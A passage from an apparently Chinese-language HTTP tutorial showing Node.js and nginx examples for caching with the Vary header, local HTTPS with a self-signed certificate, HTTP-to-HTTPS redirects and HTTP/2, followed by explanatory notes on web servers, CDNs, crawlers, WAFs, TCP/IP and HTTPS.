class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8887</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server listening on 8887'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>可以在<code>server.js</code>修改对应的返回头信息来实现各种配置（2.3 缓存Cache-Control）</p></blockquote><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ie=edge<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>This is content, and data is: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">  <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/data'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">resp</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> resp<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">text</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerText <span class="token operator">=</span> text  <span class="token punctuation">}</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210126222337746.png" alt="第一次请求 从服务器获取 耗时长"></p><p><img src="image-20210126222518856.png" alt="第二次请求 从浏览器缓存读取"></p><p><img src="image-20210126222543578.png" alt="第三次请求 从代理缓存读取"></p><p>设置头信息Vary：指定在发生一个请求的时候，只要和服务器端的指定的http头的值相同的情况下，客户端才会使用缓存</p><pre class="line-numbers language-none"><code class="language-none">'Vary': 'X-Test-Cache'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ie=edge<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>This is content, and data is: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>click me<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">  <span class="token keyword">var</span> index <span class="token operator">=</span> <span class="token number">0</span>  <span class="token keyword">function</span> <span class="token function">doRequest</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> data <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">)</span>    data<span class="token punctuation">.</span>innerText <span class="token operator">=</span> <span class="token string">''</span>    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/data'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      headers<span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token string">'X-Test-Cache'</span><span class="token operator">:</span> index<span class="token operator">++</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">resp</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> resp<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">text</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      data<span class="token punctuation">.</span>innerText <span class="token operator">=</span> text    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'button'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> doRequest<span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210126223806916.png" alt="多次请求"></p><p>​<br>​</p><h3 id="3-4-Nginx部署HTTPS服务">3.4 Nginx部署HTTPS服务</h3><p>在Nginx根目录下新建一个certs文件夹，并在里面打开git bash，输入以下命令，生成公钥和私钥</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">openssl req -x509 -newkey rsa:2048 -nodes -sha256 -keyout localhost-privket.pem -out localhost-cert.pem<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="20190106113824992.png" alt=""></p><pre class="line-numbers language-none"><code class="language-none">proxy_cache_path cache levels=1:2 keys_zone=my_cache:10m;  server {  listen      443;  server_name test.com;   listen ... ssl;  ssl_certificate_key ../certs/localhost-privket.pem;  ssl_certificate ../certs/localhost-cert.pem;   location /  {    proxy_cache my_cache;    proxy_pass http://127.0.0.1:8887;    proxy_set_header Host $host;  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210126230619376.png" alt=""></p><p>这样直接访问的时候会出现<code>400 Bad Request The plain HTTP request was sent to HTTPS port</code>错误</p><p>需要再修改<code>test.conf</code>文件：</p><pre class="line-numbers language-none"><code class="language-none">proxy_cache_path cache levels=1:2 keys_zone=my_cache:10m;  server {  listen 80;  server_name test.com;    listen 443 ssl;  ssl_certificate_key ../certs/localhost-privket.pem;  ssl_certificate ../certs/localhost-cert.pem;   location /  {    proxy_cache my_cache;    proxy_pass http://127.0.0.1:8887;    proxy_set_header Host $host;  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210126231543378.png" alt="启动成功"></p><p>还可以通过配置来实现访问HTTP协议的网址时自动转到HTTPS协议上，修改<code>test.conf</code>：</p><pre class="line-numbers language-none"><code class="language-none">proxy_cache_path cache levels=1:2 keys_zone=my_cache:10m; server {  listen        80 default_server;  listen        [::]:80 default_server;  server_name   test.com;  return 302 https://$server_name$request_uri;} server {    server_name test.com;   listen 443 ssl;  ssl_certificate_key ../certs/localhost-privket.pem;  ssl_certificate ../certs/localhost-cert.pem;   location /  {    proxy_cache my_cache;    proxy_pass http://127.0.0.1:8887;    proxy_set_header Host $host;  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还有其他Nginx配置，可以查看：<a href="http://nginx.org/en/docs/http/configuring_https_servers.html#single_http_https_server">Nginx官方文档</a></p><h3 id="3-5-Nginx简单配置HTTP2">3.5 Nginx简单配置HTTP2</h3><blockquote><p>注意：需要支持HTTPS才能使用HTTP2，通过Nginx来开启HTTP2</p></blockquote><p>修改<code>test.conf</code>：</p><pre class="line-numbers language-none"><code class="language-none">proxy_cache_path cache levels=1:2 keys_zone=my_cache:10m; server {  listen        80 default_server;  listen        [::]:80 default_server;  server_name   test.com;  return 302 https://$server_name$request_uri;} server {    server_name test.com;   listen 443 ssl http2;  ssl_certificate_key ../certs/localhost-privket.pem;  ssl_certificate ../certs/localhost-cert.pem;   location /  {    proxy_cache my_cache;    proxy_pass http://127.0.0.1:8888;    proxy_set_header Host $host;  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>server.js</code>：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span> http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">request<span class="token punctuation">,</span> response</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'request come'</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>   <span class="token keyword">const</span> html <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'test.html'</span><span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> img <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'test.jpg'</span><span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>url <span class="token operator">===</span> <span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'text/html'</span><span class="token punctuation">,</span>      <span class="token string">'Connection'</span><span class="token operator">:</span> <span class="token string">'keep-alive'</span><span class="token punctuation">,</span>      <span class="token string">'Link'</span><span class="token operator">:</span> <span class="token string">'&lt;/test.jpg&gt;; as=image; rel=preload'</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'image/jpg'</span><span class="token punctuation">,</span>      <span class="token string">'Connection'</span><span class="token operator">:</span> <span class="token string">'keep-alive'</span> <span class="token comment">// or close</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span>  <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8887</span><span class="token punctuation">)</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server listening on 8887'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ie=edge<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/test.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行<code>server.js</code>，并启动<code>Nginx</code></p><p><img src="image-20210127121127126.png" alt=""></p><p>HTTP1与HTTP2的比较</p><img src="image-20210127122742425.png" alt="HTTP1 vs HTTP2" style="zoom:80%;"><blockquote><p>不是所有浏览器都支持HTTP2，使用Ngnix开启HTTP2可以做到兼容HTTP1和HTTP2（ALPN方案）</p><p>而Ngnix与后端之间使用HTTP1</p></blockquote><p><img src="image-20210127123715040.png" alt="HTTP2"></p><p><img src="image-20210127124129626.png" alt="HTTP1"></p><h2 id="4-HTTP关联知识点">4. HTTP关联知识点</h2><h3 id="4-1-HTTP相关应用技术">4.1 HTTP相关应用技术</h3><p><img src="%E4%B8%8B%E8%BD%BD.png" alt=""></p><h4 id="4-1-1-网络">4.1.1 网络</h4><p>  互联网的正式名称是<code>Internet</code>，里面存储着无穷无尽的信息资源，我们通常所说的“上网”实际上访问的只是互联网的一个子集<code>World Wide Web</code>，它基于 HTTP 协议，传输 HTML 等超文本资源，能力也就被限制在 HTTP 协议之内。</p><p>  互联网上还有许多万维网之外的资源，例如常用的电子邮件、<code>BT</code> 和 <code>Magnet</code> 点对点下载、<code>FTP</code> 文件下载、<code>SSH</code> 安全登录、各种即时通信服务等等，它们需要用各自的专有协议来访问。不过由于 HTTP 协议非常灵活、易于扩展，而且“超文本”的表述能力很强，所以很多其他原本不属于 HTTP 的资源也可以“包装”成 HTTP 来访问，即各种“网页应用”。（如“微信网页版”“邮箱网页版”）综合来看，现在的互联网 90% 以上的部分都被万维网，也就是 HTTP 所覆盖。</p><p>​</p><h4 id="4-1-2-Web-服务器">4.1.2 Web 服务器</h4><p>  浏览器是 HTTP 里的请求方，在协议另一端的<strong>应答方</strong>就是<strong>服务器</strong>，<strong>Web Server</strong></p><p>Web服务器时有两个层面的含义：硬件和软件</p><p><strong>硬件</strong>含义就是<strong>物理形式或“云”形式的机器</strong>，在大多数情况下它可能不是一台服务器，而是利用反向代理、负载均衡等技术组成的庞大集群。但从外界看来，它仍然表现为一台机器，但这个形象是虚拟的。</p><p><strong>软件</strong>含义的 Web 服务器可能我们更为关心，它就是提供 Web 服务的应用程序，通常会运行在硬件含义的服务器上。它利用强大的硬件能力响应海量的客户端 HTTP 请求，处理磁盘上的网页、图片等静态文件，或者把请求转发给后面的业务应用，返回动态的信息。</p><p>​</p><p><code>Apache</code> 是老牌的服务器，功能相当完善，相关的资料很多，学习门槛低，是许多创业者建站的入门产品。</p><p><code>Nginx</code> 是后起之秀，高性能、高稳定，且易于扩展，自2004年推出后就不断蚕食<code>Apache</code>的市场份额。</p><p>此外还有 <code>IIS</code>、 <code>Jetty/Tomcat</code> 等，因为性能不是很高，所以在互联网上应用得较少。</p><p>​</p><h4 id="4-1-3-CDN">4.1.3 CDN</h4><p>  浏览器通常不会直接连到服务器，中间会经过“重重关卡”，其中的一个重要角色就叫做 <strong>CDN</strong></p><p>  <strong>内容分发网络</strong><code>Content Delivery Network</code>它应用了 HTTP 协议里的缓存和代理技术，代替源站响应客户端的请求。</p><p>  <strong>CDN</strong>可以缓存源站的数据，让浏览器的请求不用到达源站服务器，直接在“半路”就可以获取响应。如果调度算法很优秀，更可以找到离用户最近的节点，大幅度缩短响应时间。</p><p>  <strong>CDN</strong> 也是现在互联网中的一项重要基础设施，除了基本的网络加速外，还提供负载均衡、安全防护、边缘计算、跨运营商网络等功能，能够成倍地“放大”源站服务器的服务能力，很多云服务商都把其作为产品的一部分。</p><p>​</p><h4 id="4-1-4-爬虫">4.1.4 爬虫</h4><p>  <strong>爬虫</strong><code>Crawler</code>是一种可以自动访问 Web 资源的应用程序。据估计，互联网上至少有 50% 的流量都是由爬虫产生的，某些特定领域的比例还会更高。绝大多数是由各大搜索引擎“放”出来的，抓取网页存入庞大的数据库，再建立关键字索引，这样我们才能够在搜索引擎中快速地搜索到互联网角落里的页面。</p><p>  爬虫也有不好的一面，它会过度消耗网络资源，占用服务器和带宽，影响网站对真实数据的分析，甚至导致敏感信息泄漏。所以，又出现了“反爬虫”技术，通过各种手段来限制爬虫。其中一项就是“君子协定”<code>robots.txt</code>，约定哪些该爬，哪些不该爬。</p><p>​</p><h4 id="4-1-5-WebService-WAF">4.1.5 WebService/WAF</h4><p>  <strong>Web</strong> <strong>Service</strong>是一种由 <code>W3C</code> 定义的应用服务开发规范，使用 <code>client-server</code> 主从架构，通常使用 <code>WSDL</code> 定义服务接口，使用 <code>HTTP</code> 协议传输 <code>XML</code> 或 <code>SOAP</code> 消息，也就是说，它是<strong>一个基于 Web（HTTP）的服务架构技术</strong>，既可以运行在内网，也可以在适当保护后运行在外网。因为采用了 HTTP 协议传输数据，所以在 Web Service 架构里服务器和客户端可以采用不同的操作系统或编程语言开发，(如服务器端用 <code>Linux+Java</code>，客户端用 <code>Windows+C#</code>）具有跨平台跨语言的优点。</p><blockquote><p>Web Service 是网络服务实体，而 Web Server 是网络服务器</p></blockquote><p>​</p><p>  <strong>网络应用防火墙</strong>  <code>WAF</code>  是应用层面的“防火墙”，专门检测 HTTP 流量，是防护 Web 应用的安全技术。WAF 通常位于 Web 服务器之前，可以阻止如 <code>SQL 注入</code>、<code>跨站脚本等攻击</code>，目前应用较多的一个开源项目是 <code>ModSecurity</code>，它能够完全集成进 <code>Apache</code> 或 <code>Nginx</code>。</p><p>​</p><h4 id="4-1-6-小结">4.1.6 小结</h4><ol><li>互联网上绝大部分资源都使用 HTTP 协议传输</li><li>浏览器是 HTTP 协议里的请求方，即 User Agent</li><li>服务器是 HTTP 协议里的应答方，常用的有 Apache 和 Nginx</li><li>CDN 位于浏览器和服务器之间，主要起到缓存加速的作用</li><li>爬虫是另一类 User Agent，是自动访问网络资源的程序</li></ol><p>​</p><p>​</p><h3 id="4-2-HTTP相关协议">4.2 HTTP相关协议</h3><p><img src="2020128.png" alt=""></p><h4 id="4-2-1-TCP-IP">4.2.1 TCP/IP</h4><p>  <code>TCP/IP 协议</code>是目前网络世界事实上的标准通信协议。它实际上是一系列网络通信协议的统称，其中最核心的两个协议是<strong>TCP</strong>和<strong>IP</strong>，其他还有 <code>UDP</code>、<code>ICMP</code>、<code>ARP</code> 等，共同构成了一个复杂但有层次的协议栈。</p><p>  这个协议栈有四层，最上层是<strong>应用层</strong>，最下层是<strong>链接层</strong>，<strong>TCP 属于传输层，IP 属于网际层</strong>。</p><p>  <strong>IP 协议</strong>是<code>Internet Protocol</code>的缩写，主要目的是解决寻址和路由问题，以及如何在两点间传送数据包。IP 协议使用<strong>IP 地址</strong>的概念来定位互联网上的每一台计算机。</p><blockquote><p>现在我们使用的 IP 协议大多数是 v4 版，地址是四个用<code>.</code>分隔的数字（例如<strong>192.168.0.1</strong>），总共有 $2^{32}$，大约 42 亿个可以分配的地址。互联网的快速发展让地址的分配管理很快就捉襟见肘。所以出现了 v6 版，使用 8 组<code>:</code>分隔的数字作为地址，有$ 2^{128}$ 个</p></blockquote><p>​</p><p>  <strong>TCP 协议</strong>是<code>Transmission ControlProtocol</code>（<strong>传输控制协议</strong>）的缩写，它位于 IP 协议之上，基于 IP 协议提供可靠的、字节流形式的通信，是 HTTP 协议得以实现的基础。<strong>可靠</strong>是指保证数据不丢失，<strong>字节流</strong>是指保证数据完整，所以在 TCP 协议的两端可以如同操作文件一样访问传输的数据，就像是读写在一个密闭的管道里流动的字节。</p><p>​</p><p>​</p><h4 id="4-2-2-HTTPS">4.2.2 HTTPS</h4><blockquote><p><strong>HTTP over SSL/TLS</strong>，也就是运行在 SSL/TLS 协议上的 HTTP</p></blockquote><p>  HTTP是不安全的，因为http协议传输的数据都是未加密的明文。为了保证这些隐私数据能加密传输，于是根据<strong>SSL协议</strong><code>Secure Sockets Layer</code>用于对HTTP协议传输的数据进行加密，从而就诞生了HTTPS</p><p>  SSL/TLS是一个负责加密通信的安全协议，建立在 TCP/IP 之上，所以也是个可靠的传输协议，可以被用作 HTTP 的下层。SSL由网景公司发明，当发展到 3.0 时被标准化，改名为 <strong>TLS</strong><code>Transport Layer Security</code>，但由于历史的原因还是有很多人称之为 SSL/TLS，或者直接简称为 